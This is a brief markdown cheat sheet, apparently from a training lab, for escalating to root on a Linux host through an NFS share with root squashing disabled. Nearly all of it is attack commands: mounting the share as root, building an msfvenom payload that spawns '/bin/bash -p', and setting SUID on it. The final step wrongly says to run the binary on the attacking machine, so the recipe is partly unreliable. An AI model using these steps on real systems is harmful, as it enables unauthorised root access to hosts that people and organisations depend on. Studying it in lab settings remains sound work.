# NFS

## Info 

- Files created via NFS inherit the **remote**Â user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

## Steps

1. Check the NFS share configuration on the Debian VM:

	```
	cat /etc/exports
	```
	
2. Check if root squashing is disabled.

3. Switch to root user on the attacking machine
	
	```
	sudo su
	```

4. Create a mount point on the attacking machine and mount the **/tmp** share

	```
	mkdir /tmp/nfs  
	mount -o rw,vers=2 <IP>:/tmp /tmp/nfs
	```
	
5. Generate a payload using **msfvenom** and save it to the mounted share

	```
	msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
	```
	
6. Still using Kali's root user, make the file executable and set the SUID permission:

	```
	chmod +xs /tmp/nfs/shell.elf
	```
	
7. Execute the file on the attacking machine to gain a root shell